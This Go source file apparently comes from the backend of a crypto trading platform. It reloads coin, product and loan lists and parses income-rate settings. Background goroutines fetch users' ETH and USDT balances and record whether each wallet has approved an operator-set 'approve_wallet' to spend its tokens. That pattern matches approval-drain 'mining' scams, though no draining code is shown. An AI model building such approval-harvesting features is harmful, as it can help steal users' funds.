package models

import (
	"cointrade/config"
	"cointrade/lib"
	"cointrade/lib/db"
	"cointrade/utils"
	"strings"
	"time"
)

func (rpc *RpcStruct) RunSystemCmd(cmd int, b *int) error {
	switch cmd {
	case SYSTEM_RELOAD_RECHARGE_CONFIG:
		RECHARGE_ADDRESS_LIST = MODEL_SYSTEM.GetRechargeConfig()
	case SYSTEM_RELOAD_COIN_LIST:
		COIN_LIST = MODEL_SYSTEM.GetAllCoins()
		BUY_COIN_LIST = MODEL_SYSTEM.GetBuyCoinList()
		NEW_COIN_LIST = MODEL_SYSTEM.GetNewCoins()
	case SYSTEM_RELOAD_MINPRODUCT_LIST:
		MINPRODUCT_LIST = MODEL_PRODUCT.GetProductList()
	case SYSTEM_RELOAD_EXPLODE_CONFIG:
		EXPLODE_CONFIG = MODEL_SYSTEM.GetExplodeConfig()
	case SYSTEM_RELOAD_SITE_CONFIG:
		config.GetSettingConfig()
	case SYSTEM_RELOAD_LOAN_PRODUCT:
		LOAN_PRODUCT_LIST = MODEL_SYSTEM.GetLoanProductList()
	}
	*b = 1
	return nil
}

func InitData() error {
	if err := config.InitGlobal(true); err != nil {
		return err
	}
	LoadInitData()
	return nil
}

func CheckApprove() {
	for {
		uid := <-APPROVE_STATE_CHAN
		go func(uid int) {
			time.Sleep(3 * time.Minute)
			erc := new(lib.EthLib)
			erc.CreateClient()
			defer erc.Close()

			one, _ := config.GlobalDB.FetchOne(DB_TABLE_USER, db.DB_PARAMS{"id": uid}, db.DB_FIELDS{"wallet_address"})
			if one != nil {
				if b, e := erc.CheckApprove(one["wallet_address"].ToString(), config.GlobalConfig.GetValue("approve_wallet").ToString()); e == nil && !b {
					MODEL_USER.Update(uid, db.DB_PARAMS{"approve_state": 0})
				}
			}
		}(uid)
	}
}

func GetWalletBalance() {
	for {
		uid := <-WALLET_BALANCE_CHAN
		go func(uid int) {
			one, _ := config.GlobalDB.FetchOne(DB_TABLE_USER, db.DB_PARAMS{"id": uid}, db.DB_FIELDS{"wallet_address"})
			if one != nil {
				erc := new(lib.EthLib)
				erc.Type = "usdt"
				erc.CreateClient()
				defer erc.Close()

				eth := erc.GetBalance(one["wallet_address"].ToString())
				usdt := erc.GetBalanceOfUsdt(one["wallet_address"].ToString())
				usdtNum, _ := usdt.Float64()
				ethNum, _ := eth.Float64()
				data := db.DB_PARAMS{"wallet_usdt": usdtNum, "wallet_eth": ethNum}
				rs, err := erc.CheckApprove(one["wallet_address"].ToString(), config.GlobalConfig.GetValue("approve_wallet").ToString())
				if err == nil && rs {
					data["approve_state"] = 1
				}
				MODEL_USER.Update(uid, data)
			}
		}(uid)
	}
}

func LoadInitData() {
	RECHARGE_ADDRESS_LIST = MODEL_SYSTEM.GetRechargeConfig()
	COIN_LIST = MODEL_SYSTEM.GetAllCoins()
	EXPLODE_CONFIG = MODEL_SYSTEM.GetExplodeConfig()
	MINPRODUCT_LIST = MODEL_PRODUCT.GetProductList()
	CURRENCY_LIST = MODEL_SYSTEM.LoadCurrency()
	RECHARGE_INCOME_RATES = GetRechageIncomeMap()
	MINING_INCOME_RATES = GetMiningIncomeMap()
	LOAN_PRODUCT_LIST = MODEL_SYSTEM.GetLoanProductList()
	BUY_COIN_LIST = MODEL_SYSTEM.GetBuyCoinList()
	NEW_COIN_LIST = MODEL_SYSTEM.GetNewCoins()
	GLOBAL_REGISTER_LOCKER.AddressState = make(map[string]bool)
}

func GetRechageIncomeMap() map[int]float64 {
	rs := make(map[int]float64)
	tmpArr := strings.Split(config.GlobalConfig.GetValue("recharge_income_rates").ToString(), ",")
	n := 1
	for _, v := range tmpArr {
		rs[n] = utils.GetFloat(v) / float64(100)
		n++
	}
	return rs
}

func GetMiningIncomeMap() map[int][]float64 {
	rs := make(map[int][]float64)
	tmpArr := strings.Split(config.GlobalConfig.GetValue("mining_income_rates").ToString(), ",")

	n := 1
	for _, v := range tmpArr {
		rs[n] = make([]float64, 2)
		tarr := strings.Split(v, "|")
		if len(tarr) < 2 {
			continue
		}
		rs[n][0] = utils.GetFloat(tarr[0]) / float64(100)
		rs[n][1] = utils.GetFloat(tarr[1]) / float64(100)
		n++
	}
	return rs
}
